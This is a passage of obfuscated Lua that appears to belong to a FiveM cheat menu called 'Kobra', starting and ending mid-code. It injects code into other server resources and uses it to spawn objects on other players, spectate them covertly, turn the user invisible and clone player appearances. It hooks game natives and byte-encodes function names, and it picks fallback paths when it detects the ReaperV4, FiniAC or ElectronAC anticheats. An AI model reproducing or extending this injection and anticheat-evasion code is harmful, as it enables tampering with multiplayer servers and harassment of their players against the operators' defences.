            ]],v215,v335));v217=v217 + 1 ;elseif (GetResourceState("lc_fuel")=="started") then local v1026=0;while true do if (v1026==(718 -(493 + 225))) then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v215,v335));v217=v217 + (3 -2) ;break;end end elseif (GetResourceState("0r-illegalpack")=="started") then local v1216=0 + 0 ;while true do if (v1216==0) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v215,v335));v217=v217 + (2 -1) ;break;end end elseif (GetResourceState("xradio")=="started") then local v1336=0 + 0 ;while true do if ((0 -0)==v1336) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v215,v335));v217=v217 + 1 + 0 ;break;end end else local v1337=0 -0 ;while true do if (v1337==(1595 -(210 + 1385))) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v216,v335));v217=v217 + (1690 -(1201 + 488)) ;break;end end end end v213:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v215,v217, #v214),3099 + 1901 );end;v12.HandleSpectateToggle=function(v218,v219,v220) local v221=0 -0 ;local v222;local v223;while true do if (v221==1) then if  not v222 then v218:Notify("error","Kobra","Invalid server ID format!",3000);return;end if (v222==tonumber(GetPlayerServerId(PlayerId()))) then v218:Notify("error","Kobra","You cannot spectate yourself!",5380 -2380 );return;end v221=587 -(352 + 233) ;end if ((0 -0)==v221) then if  not v219 then v218:Notify("error","Kobra","Invalid player ID provided!",3000);return;end v222=tonumber(v219);v221=1;end if (v221==(2 + 1)) then if v223 then local v751=0;local v752;local v753;local v754;while true do if (v751==(0 -0)) then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v222)) then v218:Notify("error","Kobra","Target player not found!",3574 -(489 + 85) );print("[ReaperV4 Spectate] Error: No player found for server ID:",v222);return;end v751=1;end if (v751==(1503 -(277 + 1224))) then if v753 then local v1155,v1156=pcall(v753);if  not v1155 then print("[ReaperV4 Spectate] Execution error:",v1156);v218:Notify("error","Kobra","Failed to execute spectate code!",4493 -(663 + 830) );else print("[ReaperV4 Spectate] Code executed successfully");end else print("[ReaperV4 Spectate] Load error:",v754);v218:Notify("error","Kobra","Failed to load spectate code!",2636 + 364 );end break;end if (1==v751) then v752=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v220),v222);v753,v754=load(v752);v751=4 -2 ;end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v894=0;while true do if (v894==(875 -(461 + 414))) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v220),v222));break;end end else print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v220),v222));end break;end if (v221==2) then if v220 then v218:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v222)) or "Unknown" ,v222),503 + 2497 );else v218:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v222)) or "Unknown" ,v222),1201 + 1799 );end v223=GetResourceState("ReaperV4")=="started" ;v221=1 + 2 ;end end end;local v73={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v74() local v224=0 -0 ;while true do if (v224==(0 + 0)) then for v670,v671 in ipairs(v73) do if (GetResourceState(v671)=="started") then return v671;end end return nil;end end end local v75=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="core";end v12.EnableInvisibility=function(v225) local v226=0 + 0 ;local v227;while true do if (v226==(1 + 1)) then v227("IsEntityVisible",function(v672,...) return true;end);v227("IsEntityVisibleToScript",function(v673,...) return true;end);v226=11 -8 ;end if ((6 -3)==v226) then v227("SetEntityVisible",function(v674,v675,v676,v677) local v678=0 + 0 ;while true do if (v678==0) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v674(v675,false,v677);end return v674(v675,v676,v677);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end v226=3 + 1 ;end if (v226==(448 -(133 + 314))) then v227("CreateThread",function(v679,...) return v679(...);end);v227("PlayerPedId",function(v680,...) return v680(...);end);v226=2;end if ((1 + 3)==v226) then if  not _G.osintInvisibility.enabled then local v755=213 -(199 + 14) ;local v756;while true do if (v755==0) then _G.osintInvisibility.enabled=true;v756=PlayerPedId();v755=1;end if (v755==(7 -5)) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v1157=1549 -(647 + 902) ;local v1158;while true do if (v1157==(2 -1)) then Wait(500);break;end if ((233 -(85 + 148))==v1157) then v1158=PlayerPedId();if (v1158 and DoesEntityExist(v1158)) then SetEntityVisible(v1158,false,false);end v1157=1;end end end end);break;end if (v755==(1290 -(426 + 863))) then _G.osintInvisibility.wasVisible=IsEntityVisible(v756);SetEntityVisible(v756,false,false);v755=2;end end end break;end if ((0 -0)==v226) then v227=nil;function v227(v681,v682) local v683=1654 -(873 + 781) ;local v684;while true do if ((1 -0)==v683) then _G[v681]=function(...) return v682(v684,...);end;break;end if (v683==0) then v684=_G[v681];if ( not v684 or (type(v684)~="function")) then return;end v683=2 -1 ;end end end v226=1;end end end;v12.DisableInvisibility=function(v228) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v536=0;local v537;while true do if (v536==(1 + 0)) then if (v537 and DoesEntityExist(v537)) then SetEntityVisible(v537,_G.osintInvisibility.wasVisible,false);end break;end if (v536==(0 -0)) then _G.osintInvisibility.enabled=false;v537=PlayerPedId();v536=1 -0 ;end end end end;v12.HandleAttackClonePlayer=function(v229,v230) local v231=0 -0 ;local v232;while true do if (v231==(1948 -(414 + 1533))) then MachoHookNative(2596915000000000000 -(88 + 224) ,function(v685) return true,v685;end);MachoHookNative(15321135000000000000 -0 ,function(v686,v687,v688,v689,v690,v691,v692) return true,v686,v687,v688,v689,v690,v691,v692;end);v231=5 -3 ;end if (v231==0) then if ( not v230 or ( #v230==(0 + 0))) then return;end v232=table.concat(v230,",");v231=1;end if (v231==2) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
